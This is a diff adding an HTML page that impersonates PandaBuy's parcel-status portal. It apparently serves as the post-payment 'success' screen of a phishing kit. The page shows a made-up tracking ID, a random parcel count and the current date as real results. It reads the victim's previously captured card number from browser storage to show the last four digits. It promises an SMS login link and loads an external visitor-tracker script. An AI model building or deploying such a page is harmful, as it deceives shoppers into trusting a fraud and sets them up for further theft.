@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parcel Status - PandaBuy</title>
+    <!-- Favicon links -->
+    <link rel="icon" href="https://www.pandabuy.com/static/favicon.ico" type="image/png">
+    <link rel="shortcut icon" href="https://www.pandabuy.com/static/favicon.ico" type="image/png">
+    <link rel="apple-touch-icon" href="https://www.pandabuy.com/static/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        /* Header - Simple and Clean */
+        .header {
+            background: white;
+            border-bottom: 1px solid #e9ecef;
+            padding: 20px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-section img {
+            height: 35px;
+        }
+        
+        .logo-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #0088cc;
+        }
+        
+        .status-badge {
+            background: #d4edda;
+            color: #155724;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .status-badge i {
+            color: #28a745;
+        }
+        
+        /* Main Content */
+        .main-content {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        /* Status Header */
+        .status-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 30px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            border-left: 4px solid #28a745;
+        }
+        
+        .status-icon {
+            width: 80px;
+            height: 80px;
+            background: #28a745;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .status-icon i {
+            color: white;
+            font-size: 35px;
+        }
+        
+        .status-header h1 {
+            font-size: 28px;
+            color: #28a745;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .status-header p {
+            font-size: 16px;
+            color: #6c757d;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        /* Information Grid */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .info-card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            border: 1px solid #e9ecef;
+        }
+        
+        .info-card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .info-card-icon {
+            width: 40px;
+            height: 40px;
+            background: #e3f2fd;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0088cc;
+            font-size: 18px;
+        }
+        
+        .info-card h3 {
+            font-size: 16px;
+            color: #495057;
+            font-weight: 500;
+        }
+        
+        .info-card-value {
+            font-size: 20px;
+            font-weight: 600;
+            color: #212529;
+            margin-bottom: 5px;
+        }
+        
+        .info-card-desc {
+            font-size: 14px;
+            color: #6c757d;
+        }
+        
+        /* Tracking Section */
+        .tracking-section {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .tracking-section h2 {
+            font-size: 22px;
+            color: #495057;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .tracking-id-container {
+            background: #f8f9fa;
+            border: 2px dashed #0088cc;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .tracking-id-label {
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .tracking-id {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            font-weight: bold;
+            color: #0088cc;
+            letter-spacing: 2px;
+        }
+        
+        .tracking-note {
+            font-size: 14px;
+            color: #6c757d;
+            margin-top: 15px;
+        }
+        
+        /* Next Steps */
+        .next-steps {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            margin-bottom: 30px;
+        }
+        
+        .next-steps h2 {
+            font-size: 20px;
+            color: #495057;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .steps-list {
+            list-style: none;
+        }
+        
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            padding: 15px 0;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        
+        .step-item:last-child {
+            border-bottom: none;
+        }
+        
+        .step-icon {
+            width: 35px;
+            height: 35px;
+            background: #e8f5e9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #28a745;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        
+        .step-content h4 {
+            font-size: 16px;
+            color: #495057;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        
+        .step-content p {
+            font-size: 14px;
+            color: #6c757d;
+        }
+        
+        /* Loyalty Section */
+        .loyalty-section {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .loyalty-section h2 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .loyalty-section p {
+            font-size: 16px;
+            opacity: 0.95;
+            margin-bottom: 20px;
+        }
+        
+        .years-badge {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-block;
+        }
+        
+        /* Action Buttons */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+        
+        .btn-primary {
+            background: #0088cc;
+            color: white;
+            border: none;
+        }
+        
+        .btn-primary:hover {
+            background: #0077b3;
+            transform: translateY(-1px);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            color: #0088cc;
+            border: 1px solid #0088cc;
+        }
+        
+        .btn-outline:hover {
+            background: #0088cc;
+            color: white;
+        }
+        
+        /* Footer - Original PandaBuy Style */
+        footer {
+            background-color: #262626;
+            color: #fff;
+            padding: 60px 0 0;
+            margin-top: 60px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .footer-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-section {
+            flex: 1;
+            margin-right: 30px;
+            min-width: 200px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section:last-child {
+            margin-right: 0;
+        }
+
+        .footer-section h3 {
+            font-size: 18px;
+            margin-bottom: 24px;
+            color: #fff;
+            position: relative;
+            padding-bottom: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .footer-section h3:after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 40px;
+            height: 3px;
+            background-color: #0088cc;
+            border-radius: 2px;
+        }
+
+        .footer-section ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 14px;
+        }
+
+        .footer-section ul li a {
+            color: #bbb;
+            text-decoration: none;
+            transition: color 0.3s, transform 0.2s;
+            display: inline-block;
+            font-size: 15px;
+            position: relative;
+        }
+
+        .footer-section ul li a:hover {
+            color: #0088cc;
+            transform: translateX(5px);
+        }
+
+        .footer-section ul li a:after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 1px;
+            background-color: #0088cc;
+            bottom: -2px;
+            left: 0;
+            transition: width 0.3s ease;
+        }
+
+        .footer-section ul li a:hover:after {
+            width: 100%;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .payment-methods img {
+            height: 32px;
+            background-color: white;
+            padding: 6px;
+            border-radius: 6px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .payment-methods img:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 30px;
+            margin-top: 30px;
+            border-top: 1px solid #3a3a3a;
+            font-size: 14px;
+            color: #999;
+            letter-spacing: 0.5px;
+        }
+
+        .copyright-bar {
+            background-color: #1a1a1a;
+            padding: 18px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            margin-top: 30px;
+            border-top: 1px solid #333;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .legal-info {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            line-height: 1.7;
+            letter-spacing: 0.3px;
+        }
+
+        .legal-links {
+            margin-top: 12px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .legal-links a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: all 0.2s;
+            font-size: 12px;
+            position: relative;
+        }
+
+        .legal-links a:hover {
+            color: #0088cc;
+        }
+
+        .legal-links a:not(:last-child):after {
+            content: '•';
+            position: absolute;
+            right: -12px;
+            color: #555;
+        }
+
+        .company-info {
+            font-size: 12px;
+            color: #777;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .main-content {
+                padding: 0 15px;
+                margin: 20px auto;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 250px;
+                justify-content: center;
+            }
+            
+            .tracking-id {
+                font-size: 20px;
+                letter-spacing: 1px;
+            }
+            
+            /* Footer Responsive */
+            .footer-container {
+                flex-direction: column;
+            }
+            
+            .footer-section {
+                margin-right: 0;
+                margin-bottom: 40px;
+                width: 100%;
+            }
+            
+            .footer-section h3 {
+                font-size: 17px;
+            }
+            
+            .footer-section h3:after {
+                width: 50px;
+            }
+            
+            .footer-bottom {
+                margin-top: 20px;
+                padding-top: 20px;
+            }
+            
+            .legal-info {
+                font-size: 11px;
+            }
+            
+            .legal-links a {
+                margin: 0 5px;
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-section">
+                <img src="images/logo.png" alt="PandaBuy Logo">
+                <span class="logo-text">Parcel Status Portal</span>
+            </div>
+            <div class="status-badge">
+                <i class="fas fa-check-circle"></i>
+                <span>Parcels Located</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <!-- Status Header -->
+        <section class="status-header">
+            <div class="status-icon">
+                <i class="fas fa-search"></i>
+            </div>
+            <h1>Parcels Successfully Located</h1>
+            <p>Your parcels have been found in our warehouse database and are ready for processing. All verification steps have been completed successfully.</p>
+        </section>
+
+        <!-- Information Grid -->
+        <section class="info-grid">
+            <div class="info-card">
+                <div class="info-card-header">
+                    <div class="info-card-icon">
+                        <i class="fas fa-box"></i>
+                    </div>
+                    <h3>Parcels Found</h3>
+                </div>
+                <div class="info-card-value" id="parcelsCount">3</div>
+                <div class="info-card-desc" id="parcelsText">packages located in database</div>
+            </div>
+
+            <div class="info-card">
+                <div class="info-card-header">
+                    <div class="info-card-icon">
+                        <i class="fas fa-calendar-check"></i>
+                    </div>
+                    <h3>Processing Date</h3>
+                </div>
+                <div class="info-card-value" id="processingDate">June 12, 2025</div>
+                <div class="info-card-desc">Verification completed</div>
+            </div>
+
+            <div class="info-card">
+                <div class="info-card-header">
+                    <div class="info-card-icon">
+                        <i class="fas fa-shipping-fast"></i>
+                    </div>
+                    <h3>Estimated Delivery</h3>
+                </div>
+                <div class="info-card-value">5-7 Days</div>
+                <div class="info-card-desc">From shipment date</div>
+            </div>
+
+            <div class="info-card">
+                <div class="info-card-header">
+                    <div class="info-card-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3>Verification Method</h3>
+                </div>
+                <div class="info-card-value" id="verificationMethod">Card •••• XXXX</div>
+                <div class="info-card-desc">Identity confirmed</div>
+            </div>
+        </section>
+
+        <!-- Tracking Section -->
+        <section class="tracking-section">
+            <h2>Your Tracking Information</h2>
+            <p>Use this tracking ID to monitor your parcels and manage future orders</p>
+            
+            <div class="tracking-id-container">
+                <div class="tracking-id-label">Tracking ID</div>
+                <div class="tracking-id" id="trackingId">PB34562897CN</div>
+            </div>
+            
+            <div class="tracking-note">
+                <i class="fas fa-info-circle"></i>
+                Save this tracking ID for your records. You will receive SMS notifications with login portal access.
+            </div>
+        </section>
+
+        <!-- Next Steps -->
+        <section class="next-steps">
+            <h2>What Happens Next</h2>
+            <ul class="steps-list">
+                <li class="step-item">
+                    <div class="step-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="step-content">
+                        <h4>SMS Login Portal</h4>
+                        <p>You will receive an SMS with a secure login link to access your personal tracking portal where you can monitor all your parcels in real-time.</p>
+                    </div>
+                </li>
+                
+                <li class="step-item">
+                    <div class="step-icon">
+                        <i class="fas fa-cogs"></i>
+                    </div>
+                    <div class="step-content">
+                        <h4>Processing & Preparation</h4>
+                        <p>Your parcels are being prepared for shipment and will be processed within the next 24-48 hours.</p>
+                    </div>
+                </li>
+                
+                <li class="step-item">
+                    <div class="step-icon">
+                        <i class="fas fa-truck"></i>
+                    </div>
+                    <div class="step-content">
+                        <h4>Shipment & Tracking</h4>
+                        <p>Once shipped, you'll receive real-time tracking updates via email and SMS notifications.</p>
+                    </div>
+                </li>
+            </ul>
+        </section>
+
+        <!-- Loyalty Section -->
+        <section class="loyalty-section">
+            <h2>Thank You for Your Loyalty</h2>
+            <p>We appreciate your continued trust in PandaBuy. Your loyalty over the years means everything to us.</p>
+            <div class="years-badge">2+ Years Customer</div>
+        </section>
+
+        <!-- Action Buttons -->
+        <div class="action-buttons">
+            <a href="index.html" class="btn btn-primary">
+                <i class="fas fa-home"></i>
+                Return to Homepage
+            </a>
+            <a href="https://www.pandabuy.com/trackList" class="btn btn-outline" target="_blank">
+                <i class="fas fa-external-link-alt"></i>
+                Track Other Parcels
+            </a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-container">
+            <div class="footer-section">
+                <h3>Company</h3>
+                <ul>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Our Mission</a></li>
+                    <li><a href="#">Terms & Conditions</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Support Center</h3>
+                <ul>
+                    <li><a href="#">Help & FAQ</a></li>
+                    <li><a href="#">Contact Support</a></li>
+                    <li><a href="#">Shipping Information</a></li>
+                    <li><a href="#">Returns & Exchanges</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Legal Information</h3>
+                <ul>
+                    <li><a href="#">Terms of Service</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Cookie Policy</a></li>
+                    <li><a href="#">Prohibited Items</a></li>
+                    <li><a href="#">Customs Regulations</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Secure Payments</h3>
+                <div class="payment-methods">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/visa.svg" alt="Visa">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/mastercard.svg" alt="Mastercard">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/amex.svg" alt="American Express">
+                    <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/paypal.svg" alt="PayPal">
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2024 PandaBuy. All rights reserved. | Secure shopping guaranteed</p>
+        </div>
+        <div class="copyright-bar">
+            <div class="legal-info">
+                <div class="company-info">
+                    Copyright© 2020-2025 pandabuy.com All Rights Reserved 浙ICP备20210003110号<br>
+                    Company name: PANDA (UK) TECHNOLOGY CO., LIMITED Company number: 14052339<br>
+                    Registered office address: Flat 107 25 Indescon Square, London, England, E14 9DG
+                </div>
+                
+                <div class="legal-links">
+                    <a href="#">Terms of Service</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Cookie Policy</a>
+                    <a href="#">User Agreement</a>
+                    <a href="#">GDPR Compliance</a>
+                    <a href="#">Shipping Policy</a>
+                    <a href="#">Refund Policy</a>
+                    <a href="#">Customs Clearance</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Function to generate random tracking ID
+        function generateTrackingId() {
+            const prefix = "PB";
+            const digits = Math.floor(10000000 + Math.random() * 90000000);
+            const suffix = "CN";
+            return `${prefix}${digits}${suffix}`;
+        }
+        
+        // Function to format current date
+        function formatCurrentDate() {
+            const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 
+                           'August', 'September', 'October', 'November', 'December'];
+            const now = new Date();
+            return `${months[now.getMonth()]} ${now.getDate()}, ${now.getFullYear()}`;
+        }
+        
+        // Function to get random number of parcels (1-5)
+        function getRandomParcels() {
+            return Math.floor(1 + Math.random() * 5);
+        }
+        
+        // Initialize page data when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Generate and set tracking ID and date
+            document.getElementById('trackingId').textContent = generateTrackingId();
+            document.getElementById('processingDate').textContent = formatCurrentDate();
+            
+            const parcelCount = getRandomParcels();
+            document.getElementById('parcelsCount').textContent = parcelCount;
+            document.getElementById('parcelsText').textContent = parcelCount === 1 ? 'package located in database' : 'packages located in database';
+
+            // Try to get the payment data from sessionStorage first, then localStorage
+            let cardData = null;
+            
+            try {
+                // First check sessionStorage for fresh payment data
+                const sessionDataString = sessionStorage.getItem('paymentData');
+                if (sessionDataString) {
+                    cardData = JSON.parse(sessionDataString);
+                    console.log('Found payment data in sessionStorage:', cardData);
+                } else {
+                    // Fallback to localStorage for recent card data
+                    const recentCardString = localStorage.getItem('mostRecentCard');
+                    if (recentCardString) {
+                        cardData = JSON.parse(recentCardString);
+                        console.log('Found card data in localStorage:', cardData);
+                    }
+                }
+                
+                if (cardData) {
+                    console.log('Populating ship-out page with data:', cardData);
+
+                    // Determine card brand
+                    let brand = 'Card'; // Default
+                    if (cardData.cardNumber) {
+                         const firstDigit = cardData.cardNumber.charAt(0);
+                        if (firstDigit === '4') brand = 'Visa';
+                        else if (firstDigit === '5') brand = 'MasterCard';
+                        else if (firstDigit === '3') brand = 'American Express';
+                        else if (firstDigit === '6') brand = 'Discover';
+                    }
+                   
+                    // Get last 4 digits
+                    const lastFour = cardData.cardNumber ? cardData.cardNumber.slice(-4) : 'XXXX';
+                    
+                    // Update the verification method display
+                    document.getElementById('verificationMethod').textContent = `${brand} •••• ${lastFour}`;
+                    
+                    // Clear sessionStorage after using the data
+                    sessionStorage.removeItem('paymentData');
+
+                } else {
+                     console.log('No payment data found in sessionStorage or localStorage.');
+                }
+            } catch (e) {
+                console.error('Error getting payment data:', e);
+            }
+        });
+    </script>
+    <script src="visitor-tracker.js"></script>
+</body>
+</html> 
